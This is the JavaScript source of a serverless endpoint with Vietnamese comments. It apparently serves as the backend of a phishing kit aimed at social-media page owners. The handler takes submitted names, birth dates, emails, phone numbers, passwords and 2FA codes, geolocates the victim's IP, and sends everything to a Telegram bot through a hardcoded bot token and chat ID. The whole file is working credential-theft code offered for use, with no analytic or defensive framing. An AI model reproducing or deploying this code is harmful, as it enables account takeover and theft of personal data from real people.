const crypto = require('crypto');

const TELEGRAM_BOT_TOKEN = '8606442477:AAHGWiqoxONFe0544AfUWmxZCdoRysAcAJk';
const TELEGRAM_CHAT_IDS = '-5477819014';

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

function setSecurityHeaders(res, origin) {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function parseRequestBody(reqBody) {
    if (!reqBody) return null;
    let data = reqBody;

    if (reqBody.data && typeof reqBody.data === 'string') {
        try {
            const decoded = Buffer.from(reqBody.data, 'base64').toString('utf-8');
            data = JSON.parse(decoded);
        } catch (e) {
            console.error('Base64 decode failed:', e.message);
        }
    } else if (typeof reqBody === 'string') {
        try {
            data = JSON.parse(reqBody);
        } catch (e) {
            return null;
        }
    }

    if (typeof data !== 'object' || data === null) return null;
    return data;
}

// Thiết kế lại giao diện tin nhắn Telegram cực kỳ đẹp mắt và rõ ràng
function buildMessage(data, ip = 'Unknown') {
    let msg = `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨\n`;
    msg += `────────────────────────\n`;
    
    // Phần 1: Thông tin hệ thống & Mạng
    msg += `🌐 <b>Network & Source</b>\n`;
    msg += `• <b>IP:</b> <code>${escapeHtml(ip)}</code>\n`;
    msg += `• <b>Location:</b> ${escapeHtml(data.location || 'Unknown')}\n`;
    msg += `• <b>Domain:</b> ${escapeHtml(data.source || 'Unknown')}\n`;

    if (data.device) {
        const d = data.device;
        const deviceParts = [];
        if (d.os) deviceParts.push(escapeHtml(d.os));
        if (d.browser) deviceParts.push(escapeHtml(d.browser));
        if (d.screen) deviceParts.push(escapeHtml(d.screen));
        if (d.mobile) deviceParts.push('📱 Mobile');
        msg += `• <b>Device:</b> ${deviceParts.join(' | ') || 'Unknown'}\n`;
    }

    // Phần 2: Thông tin cá nhân
    msg += `\n👤 <b>Personal Information</b>\n`;
    if (data.fullName) msg += `• <b>Full Name:</b> <b>${escapeHtml(data.fullName)}</b>\n`;
    if (data.fanpage) msg += `• <b>Page Name:</b> ${escapeHtml(data.fanpage)}\n`;
    if (data.dob) msg += `• <b>Date of Birth:</b> ${escapeHtml(data.dob)}\n`;

    // Phần 3: Thông tin liên lạc
    msg += `\n📞 <b>Contact Details</b>\n`;
    if (data.email) msg += `• <b>Email:</b> <code>${escapeHtml(data.email)}</code>\n`;
    if (data.emailBusiness) msg += `• <b>Email Business:</b> <code>${escapeHtml(data.emailBusiness)}</code>\n`;
    if (data.phone) msg += `• <b>Phone:</b> <code>${escapeHtml(data.phone)}</code>\n`;
    if (data.note) msg += `• <b>Note:</b> <i>${escapeHtml(data.note)}</i>\n`;

    // Phần 4: Thông tin bảo mật (Nổi bật để dễ quan sát)
    if (data.password || data.code) {
        msg += `\n🔒 <b>Security Data</b>\n`;
        if (data.password) {
            msg += `• <b>Password:</b> <code>${escapeHtml(data.password)}</code>\n`;
        }
        if (data.code) {
            msg += `• <b>Code 2FA:</b> <code>${escapeHtml(data.code)}</code>\n`;
        }
    }

    msg += `────────────────────────`;
    return msg;
}

async function getIPInfo(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`, {
            headers: { 'User-Agent': 'vercel-serverless' }
        });
        const resultData = await res.json();
        if (resultData && !resultData.error) {
            const cityCode = resultData.city ? resultData.city.charAt(0).toUpperCase() : '';
            return `${resultData.city}(${cityCode}) | ${resultData.country_name}(${resultData.country_code})`;
        }
    } catch (e) {
        console.error('[IP_LOOKUP] Failed:', e.message);
    }
    return 'Unknown';
}

async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
        return false;
    }

    const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            const resData = await response.json();
            return resData.ok;
        } catch (e) {
            return false;
        }
    });

    const results = await Promise.all(promises);
    return results.some(res => res === true);
}

module.exports = async function handler(req, res) {
    const origin = req.headers.origin || '';
    setSecurityHeaders(res, origin);

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';
        const data = parseRequestBody(req.body);

        if (!data) {
            return res.status(400).json({ success: false, error: 'Invalid data format' });
        }

        const location = await getIPInfo(ip);
        const source = origin ? origin.replace(/^https?:\/\//, '').split('/')[0] : 'Unknown';
        
        const payload = {
            ...data,
            location,
            source
        };

        const msg = buildMessage(payload, ip);
        const sentSuccess = await sendTelegram(msg);

        if (sentSuccess) {
            return res.status(200).json({ success: true, session_id: crypto.randomBytes(16).toString('hex') });
        } else {
            return res.status(500).json({ success: false, error: 'Internal processing error' });
        }

    } catch (error) {
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
};
